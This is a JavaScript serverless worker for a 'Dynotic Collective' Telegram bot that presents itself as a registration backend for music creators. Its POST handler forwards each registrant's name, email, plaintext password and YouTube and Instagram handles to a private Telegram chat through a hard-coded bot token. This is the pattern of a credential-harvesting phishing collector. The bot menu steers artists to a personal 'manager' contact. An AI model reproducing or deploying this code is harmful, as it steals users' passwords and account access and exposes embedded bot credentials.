export default {
  async fetch(request) {
    const TOKEN = "7530674768:AAESh0ejg8lkOPdsjVPVAnojWmMlLkabZMU";
    const CHAT_ID = "8285810924";

    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type"
    };

    // Untuk preflight CORS
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: corsHeaders });
    }

    // === POST dari website register ===
    if (request.method === "POST") {
      try {
        const { fullname, email, password, youtube, instagram } = await request.json();

        const message = encodeURIComponent(
          `New Registration Dynotic Collective:\nName: ${fullname}\nEmail: ${email}\nPassword: ${password}\nYouTube: ${youtube}\nInstagram: ${instagram}\nTime: ${new Date().toISOString()}`
        );

        const telegramRes = await fetch(
          `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
        );

        if (!telegramRes.ok) {
          const text = await telegramRes.text();
          throw new Error("Telegram failed: " + text);
        }

        return new Response(JSON.stringify({ success: true }), {
          status: 200,
          headers: { "Content-Type": "application/json", ...corsHeaders }
        });

      } catch (err) {
        return new Response(JSON.stringify({ success: false, error: err.message }), {
          status: 500,
          headers: { "Content-Type": "application/json", ...corsHeaders }
        });
      }
    }

    // === Bagian bot Telegram ===
    if (request.method !== "POST") {
      return new Response("Dynotic Bot", { headers: corsHeaders });
    }

    const update = await request.json();
    const message = update.message || update.callback_query;
    if (!message) return new Response("ok", { headers: corsHeaders });

    const chatId = message.chat?.id || message.from?.id;

    async function sendMessage(id, text, keyboard = null) {
      const body = { chat_id: id, text, parse_mode: "HTML" };
      if (keyboard) body.reply_markup = keyboard;

      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
    }

    const mainMenu = {
      inline_keyboard: [
        [{ text: "Send a track", callback_data: "send_track" }],
        [{ text: "Business Request", callback_data: "business_request" }]
      ]
    };

    const backButton = {
      inline_keyboard: [[{ text: "↩ Back", callback_data: "main_menu" }]]
    };

    if (message.text === "/start") {
      await sendMessage(chatId,
        "≔ <b>Menu</b>:\n➀ <b>Send a track</b> — get your personal manager's contact.\n➁ <b>Business Request</b> — discuss partnerships.",
        mainMenu
      );
      return new Response("ok", { headers: corsHeaders });
    }

    if (message.data) {
      switch (message.data) {
        case "main_menu":
          await sendMessage(chatId,
            "≔ <b>Menu</b>:\n➀ <b>Send a track</b> — get your personal manager's contact.\n➁ <b>Business Request</b> — discuss partnerships.",
            mainMenu
          );
          break;
        case "send_track":
          await sendMessage(chatId, "Your manager: <b>@hydarryl</b>\nSend him the demo", backButton);
          break;
        case "business_request":
          await sendMessage(chatId, "<b>Coming soon</b>", backButton);
          break;
      }
      return new Response("ok", { headers: corsHeaders });
    }

    return new Response("ok", { headers: corsHeaders });
  },
};
